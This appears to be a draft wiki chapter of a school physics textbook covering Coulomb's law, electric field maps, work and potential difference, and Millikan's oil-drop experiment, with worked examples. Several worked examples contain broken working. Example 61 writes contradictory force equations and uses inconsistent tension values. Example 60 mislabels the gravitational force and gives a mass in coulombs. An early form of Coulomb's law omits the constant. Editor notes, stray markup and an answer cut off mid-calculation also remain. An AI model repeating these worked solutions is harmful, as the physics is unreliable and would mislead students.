
&lt;blockquote style=&quot;background: white; border: 1px solid black; padding: 1em;&quot;&gt;
Aside: As mentioned above, the basic unit of charge, namely the elementary charge, e, is carried by the electron. In a conducting
material (e.g. copper), when the atoms bond to form the material, some of the outermost, loosely bound electrons become
detached from the individual atoms and so become free to move around. The charge carried by these electrons can move around in the
material! In insulators, there are very few, if any, free electrons and so the charge cannot move around in the material.
&lt;/blockquote&gt;


If an excess of charge is put onto an insulator, it will stay where it is put and there will be a concentration of charge in that area on the object. 
However, if an excess of charge is put onto a conductor, the charges of like sign will repel each other and spread out over the surface of the
object. When two conductors are made to touch, the total charge on them is shared between the two. If the two conductors are identical,
then each conductor will be left with half of the total charge.</text>

= Electrostatic Force =

As we now know, charged objects exert a force on one another. If the charges are at rest then this force between them is
known as the electrostatic force. An interesting characteristic of the electrostatic force is that it can be either attractive or repulsive, unlike the
gravitational force which is only ever attractive. The relative charges on the two objects is what determines
whether the force between the charged objects is attractive or repulsive. If the objects have opposite charges they
attract each other, while if their charges are similar they repel each other (e.g. two metal balls which
are negatively charged will repel each other, while a positively charged ball and negatively charged ball will attract one another).

It is this force that determines the arrangement of charge on the surface of conductors. When we place a charge on a spherical
conductor the repulsive forces between the individual like charges cause them to spread uniformly over the surface of the sphere. However, for
conductors with non-regular shape there is a concentration of charge near the point or points of the object.

[[Image:Fhsst_electrost3.png|236px|]]

This collection of charge can actually allow charge to leak off the conductor if the
point is sharp enough. It is for this reason that buildings often have a lightning rod on the roof to remove any charge the
building has collected. This minimises the possibility of the building being struck by lightning.

This ''spreading out'' of charge would not occur if we were to place the charge on an insulator since charge cannot move in insulators.

== Coulomb's Law ==

The behaviour of the electrostatic force was studied in detail by Charles Coulomb around 1784. Through his observations he was able to
show that the electrostatic force between any point two point charges is directly proportional to their magnitude and inversely proportional to the square of the distance between the charges.
Thus if F is the force, Q1 and Q2 are the charges and R is their distance apart. then the law is summarized as    
                ''' F=(Q1Q2)/(R^2)''' 
                           
where ''Q''&lt;sub&gt;1&lt;/sub&gt; is the charge on the one point-like object, ''Q''&lt;sub&gt;2&lt;/sub&gt; is the charge on the second, and ''r'' is the distance between the two.
Remember her F is the mutual force that acts on both the charges exerted by one another as in Newtons third law of motion.

The magnitude of the electrostatic force between two point-like charges is given by ''Coulomb's Law'':


{|
|-
|&lt;math&gt;\begin{matrix}F = k \frac{Q_1Q_2}{r^2}\end{matrix}&lt;/math&gt;
|- 
| class=&quot;eqno&quot; align=&quot;RIGHT&quot; | (12.1)
|}

and the proportionality constant ''k'' is called the ''electrostatic constant''. We will use the value 

&lt;center&gt;&lt;math&gt;\begin{matrix}k=8.99\times10^9 {\rm N\cdot m^2/C^2.}\end{matrix}&lt;/math&gt;&lt;/center&gt;

The value of the electrostatic constant is known to a very high precision (9 decimal places). Not many physical
constants are known to as high a degree of accuracy as ''k''.

&lt;blockquote style=&quot;background: white; border: 1px solid black; padding: 1em;&quot;&gt;
Aside: Notice how similar Coulomb's Law is to the form of Newton's
Universal Law of Gravitation between two point-like particles:

&lt;math&gt;\begin{matrix}F_G=G\frac{m_1m_2}{r^2},\end{matrix}&lt;/math&gt;

where ''m''&lt;sub&gt;1&lt;/sub&gt; and ''m''&lt;sub&gt;2&lt;/sub&gt; are the masses of the two particles, ''r'' is the distance between them, and ''G'' is the gravitational constant. It is
very interesting that Coulomb's Law has been shown to be correct no matter how small the distance, nor how large the charge:
for example it still applies inside the atom (over distances smaller than &lt;math&gt;10^{-10}\rm {m}&lt;/math&gt; 
&lt;/blockquote&gt;

Let's run through a simple example of electrostatic forces.

&lt;hr style=&quot;background-color:red&quot; /&gt;

=== Worked Example 59 Coulomb's Law I===

'''Question:''' Two point-like charges carrying charges of +3&amp;times;10&lt;sup&gt;&amp;minus;9&lt;/sup&gt; C and &amp;minus;5&amp;times;10&lt;sup&gt;&amp;minus;9&lt;/sup&gt; C are 2 m apart. 
Determine the magnitude of the force between them and state whether it is attractive or repulsive.

'''Answer:'''

Step 1 : 

First draw the situation:

[[Image:Fhsst_electrost4.png|329px|]]


Step 2 : 

Is everything in the correct units? Yes, charges are in coulombs [C] and distances in meters [m].

Step 3 : 

Determine the magnitude of the force: Using Coulomb's Law we have

&lt;center&gt;&lt;math&gt;\begin{matrix}F &amp;=&amp; k\frac{Q_1Q_2}{r^2}\\&amp;=&amp; (8.99\times10^{9} {\rm N\cdot m^2/C^2}) \frac{(+3\times10^{-9}{\rm C})(-5\times 10^{-9}{\rm C})}{(2 {\rm m})^2}\\ &amp;=&amp;-\frac{(8.99)(3)(5)}{4}(10^{-9})\frac{(N\cdot m^2/C^2\!\!\!/)(C^2)}{m^2}\\&amp;=&amp; -3.37\times10^{-8} \rm N\end{matrix}&lt;/math&gt;&lt;/center&gt;

Thus the ''magnitude'' of the force is &lt;math&gt;3.37\times10^{-8}\rm {N}&lt;/math&gt;. The minus sign is a result of the two point charges having opposite signs.

Step 4 : 

Is the force attractive or repulsive? Well, since the two charges are oppositely charged, the force is ''attractive''. We can also
conclude this from the fact that Coulomb's Law gives a negative value for the force.

&lt;hr style=&quot;background-color:red&quot; /&gt;

Next is another example that demonstrates the difference in magnitude between the gravitational force and the electrostatic force.

&lt;hr style=&quot;background-color:red&quot; /&gt;

===Worked Example 60 Coulomb's Law II===
'''Question:''' Determine the electrostatic force and gravitational force between two electrons 1Aring apart (i.e. the forces felt inside an atom)
'''Answer:'''
Å
Step 1 : 

First draw the situation:

[[Image:Fhsst_electrost5.png|336px|]]

'''Riaan Note: this image is faulty, recreate'''


Step 2 : 

Get everything into S.I. units: The charge on an electron is &lt;math&gt;-1.60\times10^{-19}\rm C&lt;/math&gt;, the mass of an electron is &lt;math&gt;9.11\times10^{-31}\rm kg&lt;/math&gt;, and 1 &amp;Aring; = &lt;math&gt;1\times10^{-10}\rm m&lt;/math&gt;

Step 3 : 

Calculate the electrostatic force using Coulomb's Law:



&lt;center&gt;&lt;math&gt;\begin{matrix}F_E&amp;=&amp;k\frac{Q_1 Q_2}{r^2}=k\frac{e\cdot e}{1\AA^2}\\&amp;=&amp;(8.99\times10^{9}\rm N\cdot m^2/C^2)\frac{(-1.60\times10^{-19}{\rm C})(-1.60\times10^{-19}\rm C)}{(10^{-10}\rm m)^2}\\&amp;=&amp;2.30\times10^{-8}\rm N\end{matrix}&lt;/math&gt;&lt;/center&gt;

Hence the ''magnitude'' of the electrostatic force between the electrons is &lt;math&gt;2.30\times10^{-8}\rm N&lt;/math&gt;. (Note that the electrons carry like charge and from this we know the force must be
repulsive. Another way to see this is that the force is positive and thus repulsive.)

Step 4 : 

Calculate the gravitational force:

&lt;center&gt;&lt;math&gt;\begin{matrix}F_E&amp;=&amp;G\frac{m_1m_2}{r^2}=G\frac{m_e\cdot m_e}{(1\AA)^2}\\&amp;=&amp;(6.67\times10^{-11}{\rm N\cdot m^2/kg^2})\frac{(9.11\times10^{-31}{\rm C})(9.11\times10^{-31}{\rm kg})}{(10^{-10}{\rm m})^2}\\&amp;=&amp;5.54\times10^{-51}{\rm N}\end{matrix}&lt;/math&gt;&lt;/center&gt;

The magnitude of the gravitational force between the electrons is &lt;math&gt;5.54\times10^{-51}\rm N&lt;/math&gt;

&lt;hr style=&quot;background-color:red&quot; /&gt;

Notice that the gravitational force between the electrons is much smaller than the electrostatic force. For this reason, the gravitational
force is usually neglected when determining the force between two charged objects.

We mentioned above that charge placed on a spherical conductor spreads evenly along the surface. As a result, if we are far
enough from the charged sphere, electrostatically, it behaves as a point-like charge. Thus we can treat spherical conductors (e.g. metallic
balls) as point-like charges, with all the charge acting at the centre. 

&lt;hr style=&quot;background-color:red&quot; /&gt;

===Worked Example 61 Coulomb's Law: Challenge Question===

'''Question:''' In the picture below, X is a small negatively charged sphere with a mass of 10kg. It is suspended from the roof by an insulating rope
which makes an angle of 60&lt;sup&gt;o&lt;/sup&gt; with the roof. Y is a small positively charged sphere which has the same magnitude of charge as X. Y is fixed to the wall by means of an
insulating bracket. Assuming the system is in equilibrium, what is the magnitude of the charge on X?

'''Answer:'''
How are we going to determine the charge on X? Well, if we know the force between X and Y we can use Coulomb's Law to determine their
charges as we know the distance between them. So, firstly, we need to determine the magnitude of the electrostatic force between X and Y.

Step 1 : 

Is everything in S.I. units? The distance between X and Y is &lt;math&gt;50{\rm cm}=0.5\rm m&lt;/math&gt;, and the mass of X is 10kg.

Step 2 : 

Draw the forces on X (with directions) and label.

Step 3 : 

Determine the magnitude of the electrostatic force (''F''&lt;sub&gt;E&lt;/sub&gt;). Since nothing is moving (system is in equilibrium) the
vertical and horizontal components of the forces must cancel. Thus

&lt;center&gt;&lt;math&gt;\begin{matrix}F_E=T\sin(60^o) \qquad\qquad F_g=T\sin(60^o).\end{matrix}&lt;/math&gt;&lt;/center&gt;

The only force we know is the gravitational force ''F''&lt;sub&gt;g&lt;/sub&gt; = ''mg''. Now we can calculate the magnitude of ''T'' from above:

&lt;center&gt;&lt;math&gt;\begin{matrix}T=\frac{F_g}{\sin(60^o)}=\frac{(10{\rm kg})(10\rm m/s^2)}{\sin(60^o)}=1155{\rm N}.\end{matrix}&lt;/math&gt;&lt;/center&gt;


Which means that ''F''&lt;sub&gt;E&lt;/sub&gt; is:

&lt;center&gt;&lt;math&gt;\begin{matrix}F_E=T\cos(60^o)=1154\rm N\cdot \cos(60^o)=577.5\rm N\end{matrix}&lt;/math&gt;&lt;/center&gt;

Step 4 : 

Now that we know the magnitude of the electrostatic force between X and Y, we can calculate their charges using Coulomb's
Law. Don't forget that the magnitudes of the charges on X and Y are the same: &lt;math&gt;|Q_{\rm X}|=|Q_{\rm Y}|&lt;/math&gt;. The magnitude of the
electrostatic force is

&lt;center&gt;&lt;math&gt;\begin{matrix}F_E &amp;=&amp; k\frac{|Q_{\rm X}Q_{\rm Y}|}{r^2}= k\frac{Q_{\rm X}^2}{r^2}\\ |Q_{\rm X}|&amp;=&amp;\sqrt{\frac{F_E r^2}{k}}\\&amp;=&amp;\sqrt{\frac{(577.5{\rm N})(0.5{\rm m})^2}{8.99\times10^{9}{\rm N\cdot m^2/C^2}}}\\&amp;=&amp;1.27\times10^{-4}{\rm C}\end{matrix}&lt;/math&gt;&lt;/center&gt;


Thus the charge on X is &lt;math&gt;-1.27\times10^{-4}{\rm C}&lt;/math&gt;</text>

= Electric Fields =

We have learnt that objects that carry charge feel forces from all other charged objects. It is useful to determine what the effect of a
charge would be at every point surrounding it. To do this we need some sort of reference.

We know that the force that one charge feels due to another depends on both charges (''Q''&lt;sub&gt;1&lt;/sub&gt; and ''Q''&lt;sub&gt;2&lt;/sub&gt;). How then can we talk about
forces if we only have one charge? The solution to this dilemma is to introduce a test charge. We then determine the force that would
be exerted on it if we placed it at a certain location. If we do this for every point surrounding a charge we know what would happen if we put a test charge at any location. 

This map of what would happen at any point we call a field map. It is a map of the electric field ''due to a charge''. It tells us how
large the force on a test charge would be and in what direction the force would be.

Our map consists of the lines that tell us how the test charge would move if it were placed there.

== Test Charge ==

This is the key to mapping out an electric field. The equation for the force between two electric charges has been shown earlier and is:

{| 
|-
|&lt;math&gt;\begin{matrix}F=k\frac{Q_1Q_2}{r^2}.\end{matrix}&lt;/math&gt;
|-
| class=&quot;eqno&quot; align=&quot;RIGHT&quot; | (12.2)
|}

If we want to map the field for ''Q''&lt;sub&gt;1&lt;/sub&gt; then we need to know exactly what would happen if we put ''Q''&lt;sub&gt;2&lt;/sub&gt; at every point around ''Q''&lt;sub&gt;1&lt;/sub&gt;. But
this obviously depends on the value of ''Q''&lt;sub&gt;2&lt;/sub&gt;. This is a time when we need to agree on a convention. What should ''Q''&lt;sub&gt;2&lt;/sub&gt; be when we
make the map? By convention we choose ''Q''&lt;sub&gt;2&lt;/sub&gt; = + 1''C''.

This means that if we want to work out the effects on any other charge we only have to multiply the result for the test charge by the
magnitude of the new charge.

The electric field strength is then just the force per unit of charge and has the same magnitude and direction as the force on our
test charge but has different units: 

{|
|-
|&lt;math&gt;\begin{matrix}E=k\frac{Q_1}{r^2}\end{matrix}&lt;/math&gt;
|-
| class=&quot;eqno&quot; align=&quot;RIGHT&quot; | (12.3)
|}

The electric field is the force per unit of charge and hence has units of newtons per coulomb [N/C].

So to get the force the electric field exerts we use:

{|
|-
|&lt;math&gt;\begin{matrix}F=EQ\end{matrix}&lt;/math&gt;
|-
| class=&quot;eqno&quot; align=&quot;RIGHT&quot; | (12.4)
|}

Notice we are just multiplying the electric field magnitude by the magnitude of the charge it is acting on.

== What do field maps look like? ==

The maps depend very much on the charge or charges that the map is being made for. We will start off with the simplest possible
case. Take a single positive charge with no other charges around it. First, we will look at what effects it would have on a test
charge at a number of points.

=== Positive Charge Acting on Test Charge ===

At each point we calculate the force on a test charge, ''q'', and represent this force by a vector.

[[Image:Fhsst_electrost8.png|293px|]]

We can see that at every point the positive test charge, ''q'', would experience a force pushing it away from the charge, ''Q''. This is because
both charges are positive and so they repel. Also notice that at points further away the vectors are shorter. That is because the force
is smaller if you are further away.

If the charge were negative we would have the following result.

=== Negative Charge Acting on Test Charge ===

[[Image:Fhsst_electrost9.png|293px|]]

Notice that it is almost identical to the positive charge case. This is important - the arrows are the same length because the
magnitude of the charge is the same and so is the magnitude of the test charge. Thus the magnitude of the force is the same.
The arrows point in the opposite direction because the charges now have opposite sign and so the test charge is
attracted to the charge.

Now, to make things simpler, we draw continuous lines showing the path that the test charge would travel. This means we don't have to work
out the magnitude of the force at many different points.

=== Electric Field Map due to a Positive Charge ===

[[Image:Fhsst_electrost10.png|291px|]]

Some important points to remember about electric fields:

* There is an electric field at every point in space surrounding a charge.
* Field lines are merely a representation - they are not real. When we draw them, we just pick convenient places to indicate the field in space.
* Field lines always start at a right-angle (90&lt;sup&gt;o&lt;/sup&gt;) to the charged object causing the field.
* Field lines never cross!

== Combined Charge Distributions ==

We look at the field of a positive charge and a negative charge placed next to each other. The net resulting field would be the addition of the
fields from each of the charges. To start off with let us sketch the field maps for each of the charges as though it were in isolation.

=== Electric Field of Negative and Positive Charge in Isolation ===

[[Image:Fhsst_electrost11.png|562px|]]

Notice that a test charge starting off directly between the two would be pushed away from the positive charge and pulled towards the
negative charge in a straight line. The path it would follow would be a straight line between the charges.

[[Image:Fhsst_electrost12.png|553px|]]

Now let's consider a test charge starting off a bit higher than directly between the charges. If it starts closer to the positive charge
the force it feels from the positive charge is greater, but the negative charge does attract it, so it would move away from the
positive charge with a tiny force attracting it towards the negative charge. As it gets further from the positive charge the force from the
negative and positive charges change and they are equal in magnitude at equal distances from the charges. After that point the negative charge starts to
exert a stronger force on the test charge. This means that the test charge moves towards the negative charge with only a small force away
from the positive charge.

[[Image:Fhsst_electrost13.png|553px|]]

Now we can fill in the other lines quite easily using the same ideas. The resulting field map is:

[[Image:Fhsst_electrost14.png|553px|]]

=== Two Like Charges I: The Positive Case ===

For the case of two positive charges things look a little different. We can't just turn the arrows around the way we did
before. In this case the test charge is repelled by both charges. This tells us that a test charge will never cross half way because the
force of repulsion from both charges will be equal in magnitude. 

[[Image:Fhsst_electrost15.png|553px|]]

The field directly between the charges cancels out in the middle. The force has equal magnitude and opposite direction. Interesting
things happen when we look at test charges that are not on a line directly between the two.

[[Image:Fhsst_electrost16.png|553px|]]

We know that a charge the same distance below the middle will experience a force along a reflected line, because the problem is
symmetric (i.e. if we flipped vertically it would look the same). This is also true in the horizontal direction. So we use this fact to
easily draw in the next four lines.

[[Image:Fhsst_electrost17.png|553px|]]

Working through a number of possible starting points for the test charge we can show the electric field map to be:

[[Image:Fhsst_electrost18.png|553px|]]

=== Two Like Charges II: The Negative Case ===

We can use the fact that the direction of the force is reversed for a test charge if you change the sign of the charge that is influencing
it. If we change to the case where both charges are negative we get the following result:

[[Image:Fhsst_electrost19.png|553px|]]

== Parallel plates ==
One very important example of electric fields which is used extensively is the electric field between two charged parallel plates. In this
situation the electric field is constant. This is used for many practical purposes and later we will explain how Millikan used it to
measure the charge on the electron.

=== Field Map for Oppositely Charged Parallel Plates ===

[[Image:Fhsst_electrost20.png|312px|]]

This means that the force that a  would feel at any point between the plates would be identical in magnitude and direction. The
fields on the edges exhibit fringe effects, i.e. they bulge outwards. This is because a test charge placed here would feel the
effects of charges only on one side (either left or right depending on which side it is placed). Test charges placed in the
middle experience the effects of charges on both sides so they balance the components in the horizontal direction. This isn't the case on the edges.

===The Force on a Test Charge between Oppositely Charged Parallel Plates===

[[Image:Fhsst_electrost21.png|312px|]]

==What about the Strength of the Electric Field?==
When we started making field maps we drew arrows to indicate the strength of the field and the direction. When we moved to lines you might have asked
&quot;Did we forget about the field strength?&quot;. We did not. Consider the case for a single positive charge again:

[[Image:Fhsst_electrost22.png|312px|]]

Notice that as you move further away from the charge the field lines become more spread out. In field map diagrams the closer field lines are together the stronger the field. 
This brings us to an interesting case. What is the electric field like if the object that is charged has an irregular shape.</text>

== Work Done and Energy Transfer in a Field ==

When a charged particle moves in an electric field work is done and energy transfers take place. This is exactly analogous to the case
when a mass moves in a gravitational field such as that set up by any massive object.

=== Work done by a field ===
====Gravitational Case====
A mass held at a height ''h'' above the ground has '''gravitational potential energy''' since, if released, it will fall under the action
of the gravitational field. Once released, in the absence of friction, only the force of gravity acts on the mass and the mass accelerates in
the direction of the force (towards the Earth's centre). 

[[Image:Fhsst electrost23.png|182px|]]

In this way, work is done by the field. When the mass falls a distance ''h'' (from point A to B), the work done is,

&lt;center&gt;&lt;math&gt;\begin{matrix}W &amp;=&amp; Fs\\&amp;=&amp; mgh\end{matrix}&lt;/math&gt;&lt;/center&gt;

In falling, the mass loses gravitational potential energy and gains kinetic energy.

'''Energy is conserved!'''

The work done by the field is equal to the energy transferred,

&lt;center&gt;&lt;math&gt;\begin{matrix}W = \mathrm{Gain\ in\ }E_k = \mathrm{Loss\ in\ }E_p\qquad\mathrm{(a\ falling\ mass)}\end{matrix}&lt;/math&gt;&lt;/center&gt;

====Electrical Case====
A charge in an electric field has '''electrical potential energy''' since, if released, it will move under the action of the electric
field. When released, in the absence of friction, only the electric force acts on the charge and the charge accelerates in the direction
of the force (for positive charges the force and acceleration are in the direction of the electric field, while negative charges experience
a force and acceleration in the opposite direction to the electric field.) Consider a positive charge +''Q'' placed in the uniform electric
field between oppositely charged parallel plates.

[[Image:Fhsst electrost24.png|182px|]]

The positive charge will be repelled by the positive plate and attracted by the negative plate (i.e. it will move in the direction of the electric field lines). In this way, work is done by the field. In moving the charge a distance ''s'' in the electric field, the work done is,

&lt;center&gt;&lt;math&gt;\begin{matrix}W &amp;=&amp; Fs\\&amp;=&amp; QEs\qquad\mathrm{since\ }E={F\over Q}.\end{matrix}&lt;/math&gt;&lt;/center&gt;

In the process of moving, the charge loses electrical potential energy and gains kinetic energy. The work done by the field is equal to the energy transferred,

&lt;center&gt;&lt;math&gt;\begin{matrix}W &amp;=&amp; \mathrm{Gain\ in\ }E_k = \mathrm{Loss\ in\ }E_p\qquad\mathrm{(charge\ moving\ under\ the\ influence\ of\ an\ electric\ field)}\end{matrix}&lt;/math&gt;&lt;/center&gt;

=== Work done by us ===
====Gravitational Case====

In order to return the mass ''m'' in Figure 12.1 to its original position (i.e. lift it a distance ''h'' from B back to A) we have to apply a force ''mg'' to balance the force of gravity. An amount of work ''mgh'' is done by the lifter. In the process, the mass gains gravitational potential energy,

&lt;center&gt;&lt;math&gt;\begin{matrix}mgh &amp;=&amp; \mathrm{Gain\ in\ }E_p\qquad\mathrm{(lifting\ a\ mass)}\end{matrix}&lt;/math&gt;&lt;/center&gt;

====Electrical Case====

In order to return the charge in Figure 12.2 to its original position (i.e. from B back to A) we have to exert a force ''QE'' on the
charge to balance the force exerted on it by the electric field. An amount of work ''QEs'' is done by us. In the process, the charge gains
electrical potential energy,

&lt;center&gt;&lt;math&gt;\begin{matrix}QEs &amp;=&amp; \mathrm{Gain\ in\ }E_p\qquad\mathrm{(charge\ moved\ against\ an\ electric\ field)}\end{matrix}&lt;/math&gt;&lt;/center&gt;

In summary, '''when an object moves under the influence of a field, the field does work and potential energy is transferred into kinetic
energy. Potential energy is lost, while kinetic energy is gained. When an object is moved against a field we have to do work and the object gains potential energy.'''

&lt;hr style=&quot;background-color:red&quot; /&gt;

=====Worked Example 62 Work done and energy transfers in a field=====

'''Question:'''
A charge of +5nC is moved a distance of 4&amp;nbsp;cm against a uniform electric field of magnitude &lt;math&gt;2\times10^{12}\mathrm{N.C^{-1}}&lt;/math&gt; from A to B.

(a) Calculate the work done in moving the charge from A to B.
(b) The charge is now released and returns to A. Calculate the kinetic energy of the charge at A.

'''Answer:'''
(a)
Step 1 : 

We are given the values of the charge, the field and the distance the charge must move. All are in the correct units.

Step 2 : 

Since the charge is positive we have to do work to move it from A to B (since this is against the field). This work is given by,

&lt;center&gt;&lt;math&gt;\begin{matrix}W &amp;=&amp; QEs\\&amp;=&amp; (5\times10^{-9})(2\times10^{12})(0.04)\\&amp;=&amp; 400\ \mathrm{J}\end{matrix}&lt;/math&gt;&lt;/center&gt;

(b)

Step 3 : 

When released the charge moves under the influence of the electric field and returns to A. Work is now done by the field and the work done is equal to the kinetic energy gained,

&lt;math&gt;\begin{matrix}\mathrm{Gain\ in\ }E_k &amp;=&amp; QEs\\&amp;=&amp; (5\times10^{-9})(2\times10^{12})(0.04)\\&amp;=&amp; 400\ \mathrm{J}\end{matrix}&lt;/math&gt;

Since the charge started at rest, the gain in kinetic energy is the final kinetic energy,

&lt;center&gt;&lt;math&gt;\begin{matrix}E_k^{\mathrm{at\ A}} &amp;=&amp; 400\ \mathrm{J}\end{matrix}&lt;/math&gt;&lt;/center&gt;

== Electrical Potential Difference ==

Consider a positive test charge + ''Q'' placed at A in the electric field of another positive point charge.

[[Image:Fhsst electrost25.png|297px|]]

The test charge moves towards B under the influence of the electric field of the other charge. In the process the test charge loses
electrical potential energy and gains kinetic energy. Thus, at A, the test charge has more potential energy than at B - '''A is said to
have a higher electrical potential than B'''. The potential energy of a charge at a point in a field is defined as the work required to move that charge from infinity to that point.

The '''potential difference between two points''' in an electric field is defined as the '''work required to move a unit positive test charge from the point of lower potential to that of higher potential'''. If an amount of work ''W'' is required to move a charge ''Q'' from one point to another, then the potential difference between the two points is given by,

&lt;center&gt;&lt;math&gt;\begin{matrix}V &amp;=&amp;{W\over Q}\qquad \mathrm{unit:J.C^{-1}\ or\ V\ (the\ volt)}\end{matrix}&lt;/math&gt;&lt;/center&gt;

From this equation it follows that one volt is the potential difference between two points in an electric field if one joule of
work is done in moving one coulomb of charge from the one point to the other.

&lt;hr style=&quot;background-color:red&quot; /&gt;

===Worked Example 63 Potential difference===

'''Question:'''
A positively charged object Q is placed as shown in the sketch. The potential difference between two points A and B is &lt;math&gt;4\times10^{-4}\ \mathrm{V}&lt;/math&gt;

[[Image:Fhsst electrost26.png|191px|]]

(a) Calculate the change in electrical potential energy of a +2nC charge when it moves from A to B.
(b) Which point, A or B, is at the higher electrical potential? Explain.
(c) If this charge were replaced with another of charge -2nC, in what way would its change in energy be affected?

'''Answer:'''
(a) 
The electrical potential energy of the positive charge decreases as it moves from A to B since it is moving in the direction of the electric field produced by the object Q. This loss in potential energy is equal to the work done by the field,

&lt;center&gt;&lt;math&gt;\begin{matrix}\mathrm{Loss\ in\ Electrical\ Potential\ Energy} &amp;=&amp; W\\&amp;=&amp;VQ\qquad \mathrm{(Since\ }V={W\over Q})\\&amp;=&amp; (4\times10^{-4})(2\times10^{-9})\\&amp;=&amp; 8\times10^{-13}\ \mathrm{J}\end{matrix}&lt;/math&gt;&lt;/center&gt;

(b) Point A is at the higher electrical potential since work is required by us to move a positive test charge from B to A.
(c) If the charge is replaced by one of negative charge, the electrical potential energy of the charge will increase in moving from A to B (in this case we would have to do work on the charge).

As an example consider the electric field between two oppositely charged parallel plates a distance ''d'' apart maintained at a potential
difference ''V''.

[[Image:Fhsst electrost27.png|227px|]]

This electric field is uniform so that a charge placed anywhere between the plates will experience the same force. Consider a positive test charge ''Q'' placed at point O just off the surface of the negative plate. In order to move it towards the positive plate we have to apply a force ''QE''. 
The work done in moving the charge from the negative to the positive plate is, 

&lt;center&gt;&lt;math&gt;\begin{matrix}W &amp;=&amp; Fs \\&amp;=&amp; QEd,\end{matrix}&lt;/math&gt;&lt;/center&gt;

but from the definition of electrical potential, 

&lt;center&gt;&lt;math&gt;\begin{matrix}W &amp;=&amp; VQ.\end{matrix}&lt;/math&gt;&lt;/center&gt;

Equating these two expressions for the work done, 

&lt;center&gt;&lt;math&gt;\begin{matrix}QEd &amp;=&amp; VQ,\end{matrix}&lt;/math&gt;&lt;/center&gt;

and so, rearranging,

&lt;center&gt;&lt;math&gt;\begin{matrix}E &amp;=&amp; {V\over d}.\qquad \end{matrix}&lt;/math&gt;&lt;/center&gt;

&lt;hr style=&quot;background-color:red&quot; /&gt;

===Worked Example 64 Parallel plates===
'''Question:'''
Two charged parallel plates are at a distance of 180&amp;nbsp;mm from each other. The potential difference between them is &lt;math&gt;3600\ \mathrm{V}&lt;/math&gt; as shown in the diagram.

[[Image:Fhsst electrost28.png|236px|]]

(a) If a small oil drop of negligible mass, carrying a charge of &lt;math&gt;+6.8\times10^{-9}\ \mathrm{C}&lt;/math&gt;, is placed between the plates at point X, calculate the magnitude and direction of the electrostatic force exerted on the droplet.

(b) If the droplet is now moved to point Y, would the force exerted on it be bigger, smaller or the same as in (a)?

'''Answer:'''
(a)

Step 1 : 

First find the electric field strength between the plates,

&lt;center&gt;&lt;math&gt;\begin{matrix}E &amp;=&amp; {V \over d}\\&amp;=&amp; {3600\over 0.180}\\&amp;=&amp; 20000\ \mathrm{N.C^{-1}\ from\ the\ positive\ to\ the\ negative\ plate}\end{matrix}&lt;/math&gt;&lt;/center&gt;

Step 2 : 

Now the force exerted on the charge at X is,

&lt;center&gt;&lt;math&gt;\begin{matrix}F &amp;=&amp; QE\\&amp;=&amp; (6.8\times10^{-9})(20000)\\&amp;=&amp; 1.36\times10^{-4}\ \mathrm{down}\end{matrix}&lt;/math&gt;&lt;/center&gt;

Step 3 : 

The same. Since the electric field strength is uniform, the force exerted on a charge is the same at all points between the plates.

== Millikan's Oil-drop Experiment ==

Robert Millikan measured the charge on an electron by studying the motion of charged oil drops between oppositely charged parallel plates.

Consider one such negative drop between the plates in Figure 12.3. Since this drop is negative, the electric field exerts an upward force on the drop. In addition to this upward force, gravity exerts a downward force on the drop. Millikan adjusted the electric field strength between the plates by varying the potential difference applied across the plates. In this way, Millikan was able to bring the drops to rest.  *EDIT* Millikan's experiment was ment to have the drops fall at a constant rate.  At this constant rate the force of the earth on the drop and the force of the field on the drop are equal *End EDIT*

&lt;center&gt;&lt;math&gt;\begin{matrix}F_{\mathrm{up}} &amp;=&amp; F_{\mathrm{down}}\\QE &amp;=&amp; mg\end{matrix}&lt;/math&gt;&lt;/center&gt;

Since &lt;math&gt;E={V \over d}&lt;/math&gt;

&lt;center&gt;&lt;math&gt;\begin{matrix}Q{V \over d} &amp;=&amp; mg,\\\end{matrix}&lt;/math&gt;&lt;/center&gt;

and, therefore,

&lt;center&gt;&lt;math&gt;\begin{matrix}Q &amp;=&amp; {mgd\over V}\end{matrix}&lt;/math&gt;&lt;/center&gt;

Millikan found that all drops had charges which were multiples of &lt;math&gt;1.6\times10^{-19}\ \mathrm{C}&lt;/math&gt;. Since objects become charged by gaining or losing electrons, the charge on an electron must be &lt;math&gt;-1.6\times10^{-19}\ \mathrm{C}&lt;/math&gt;. The magnitude of the electron's charge is denoted by ''e'',

&lt;center&gt;&lt;math&gt;\begin{matrix}e &amp;=&amp; 1.6\times10^{-19}\ \mathrm{C}\end{matrix}&lt;/math&gt;&lt;/center&gt;

&lt;hr style=&quot;background-color:red&quot; /&gt;

===Worked Example 65 Charge===

'''Question:'''
A metal sphere carries a charge of &lt;math&gt;+3.2\times10^{-8}\ \mathrm{C}&lt;/math&gt;. How many electrons did it have to lose to attain its charge?

'''Answer:'''
Since the sphere is positive it lost electrons in the process of charging (when an object loses negative charges it is left positive). In fact, it lost,

&lt;center&gt;&lt;math&gt;\begin{matrix}{3.2\times10^{-8}\over 1.6\times10^{-19}}&amp;=&amp; 2\times10^{11}\ \mathrm{electrons}\end{matrix}&lt;/math&gt;&lt;/center&gt;

&lt;hr style=&quot;background-color:red&quot; /&gt;

===Worked Example 66 Millikan oil-drop experiment===

'''Question:'''
In a Millikan-type experiment a positively charged oil drop is placed between two horizontal plates, 20&amp;nbsp;mm apart, as shown.

[[Image:Fhsst electrost30.png|227px|]]

The potential difference across the plates is 4000V. The drop has a mass of &lt;math&gt;1.2\times10^{-14}&lt;/math&gt; and a charge of &lt;math&gt;8\times10^{-19}&lt;/math&gt;.
(a) Draw the electric field pattern between the two plates.
(b) Calculate:

# the electric field intensity between the two plates.
# the magnitude of the gravitational force acting on the drop.
# the magnitude of the Coulomb force acting on the drop.

(c) The drop is observed through a microscope. What will the drop be seen to do? Explain.
(d) Without any further calculations, give two methods that could be used to make the drop remain in a fixed position.

'''Answer:'''
(a)

[[Image:Fhsst electrost31.png|227px|]]

(b) 
1. 

&lt;center&gt;&lt;math&gt;\begin{matrix}E &amp;=&amp; {V \over d}\\&amp;=&amp; {4000 \over 0.02}\\&amp;=&amp; 2\times 10^5\ \mathrm{V.m^{-1}\ up}\\\end{matrix}&lt;/math&gt;&lt;/center&gt;

2.

&lt;center&gt;&lt;math&gt;\begin{matrix}F_{\mathrm{grav}} &amp;=&amp; mg\\&amp;=&amp; (1.2\times10^{-14})(10)\\&amp;=&amp; 1.2\times 10^{-13}\mathrm{N}\end{matrix}&lt;/math&gt;&lt;/center&gt;

3.

